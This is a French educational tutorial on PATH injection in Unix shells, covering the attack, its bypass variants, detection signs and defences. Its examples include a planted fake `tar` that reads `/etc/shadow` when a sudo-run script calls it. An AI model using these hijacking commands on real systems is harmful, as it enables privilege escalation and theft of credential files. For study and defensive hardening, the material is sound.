# Path Injection

Manipulation de la variable d'environnement `PATH` pour détourner l'exécution d'un programme

## 📌 Introduction

Le **Path Injection** est une attaque qui consiste à injecter un répertoire malveillant dans la variable d'environnement `PATH`.

**Le but :**
Faire exécuter un binaire malveillant à la place d'un binaire légitime, sans avoir besoin de remplacer ou modifier le binaire original.

C'est l'équivalent de mettre un faux outil en premier dans une boîte à outils : dès qu'on demande un outil, c'est le faux qui est pris.

---

## 1. Fonctionnement de PATH

Quand une commande est exécutée :

```bash
ls
```

Le système cherche `ls` dans chacun des répertoires listés dans `$PATH`, dans l'ordre :

```
/bin
/usr/bin
/usr/local/bin
...
```

Le **premier fichier trouvé** est exécuté.

L'attaque utilise ce comportement naturel.

---

## 2. Principe du Path Injection

L'attaquant ajoute un répertoire qu'il contrôle **en début du PATH**.

**Exemple :**

```bash
export PATH=/tmp/malicious:$PATH
```

Ce répertoire contient un faux binaire, par exemple :

```
/tmp/malicious/ls
```

Dès que la victime tape :

```bash
ls
```

→ c'est la version malveillante qui est exécutée.

---

## 3. Exemple d'attaque simple

Dans `/tmp/malicious/ls`, l'attaquant met :

```bash
#!/bin/bash
echo "Powned!"
/bin/ls "$@"
```

Puis :

```bash
chmod +x /tmp/malicious/ls
export PATH=/tmp/malicious:$PATH
```

**Résultat :**

```bash
ls
Powned!
...
```

Cela permet :
- d'exécuter du code malveillant
- de logger des informations
- d'espionner l'utilisateur
- d'exécuter des commandes invisibles

---

## 4. Exploitation dans les scripts vulnérables

Beaucoup de programmes utilisent :
- `system("ls")`
- `exec("cp fileA fileB")`
- `os.system("tar ...")`

Si le script est lancé avec des privilèges (admin, root, SUID), et qu'il utilise des commandes sans chemin complet, alors Path Injection peut mener à une **escalade de privilèges**.

### Exemple dangereux :

```bash
#!/bin/bash
# Script lancé avec sudo
backup() {
    tar czf backup.tar.gz /home/user
}
```

Ici, l'attaquant peut créer un faux `tar` :

```bash
echo '#!/bin/bash' > /tmp/malicious/tar
echo 'cat /etc/shadow' >> /tmp/malicious/tar
chmod +x /tmp/malicious/tar

export PATH=/tmp/malicious:$PATH
./script_backup.sh  # se lance en sudo → compromis total
```

---

## 5. Bypass fréquents

Pour tenter une Path Injection sans être directement détecté, un attaquant peut :

### ✔️ Mettre un PATH temporaire

```bash
PATH=/tmp/mal:$PATH <commande>
```

### ✔️ Modifier PATH dans un sous-shell

```bash
( PATH=/tmp/mal:$PATH ; programme )
```

### ✔️ Modifier PATH dans un script mal configuré

Certains scripts font :

```bash
PATH="$PATH:/un/dossier"
```

Un attaquant peut rendre ce dossier malveillant.

---

## 6. Signes d'une attaque Path Injection

- Présence d'un répertoire étrange au début du PATH
- Binaires inconnus dans des répertoires contrôlables (`/tmp`, `$HOME/bin`)
- Logs signalant des commandes anormales
- Comportement bizarre de `ls`, `cp`, `tar`, `ssh`…

---

## 7. Comment s'en protéger

### ✔️ Toujours utiliser des chemins absolus dans les scripts

```bash
/bin/ls
/usr/bin/tar
/bin/cp
```

### ✔️ Ne pas faire confiance au PATH

Dans les scripts critiques :

```bash
export PATH="/usr/bin:/bin"
```

### ✔️ Éviter d'utiliser `system()` ou `sh -c` avec des commandes non qualifiées

**Exemple dangereux :**

```python
os.system("cat " + filename)
```

### ✔️ Interdire les répertoires non sûrs dans le PATH

- `/tmp`
- `/dev/shm`
- `.` (répertoire courant)
- Dossiers écrivables par l'utilisateur

### ✔️ Vérifier le PATH dans les programmes sensibles

---

## 8. Résumé

- Le **Path Injection** consiste à ajouter un répertoire contrôlé par l'attaquant dans le PATH.
- Le faux binaire placé dans ce répertoire est exécuté **avant** le binaire légitime.
- Cela permet :
  - Exécution de malware
  - Vol d'informations
  - Escalade de privilèges (si le contexte est sensible)
- La défense repose sur :
  - Chemins absolus
  - PATH strict
  - Scripts sûrs
  - Interdiction d'utiliser `system()` avec des commandes non qualifiées

---

**⚠️ Avertissement :** Ce document est à usage éducatif uniquement. L'exploitation de vulnérabilités sur des systèmes sans autorisation est illégale.
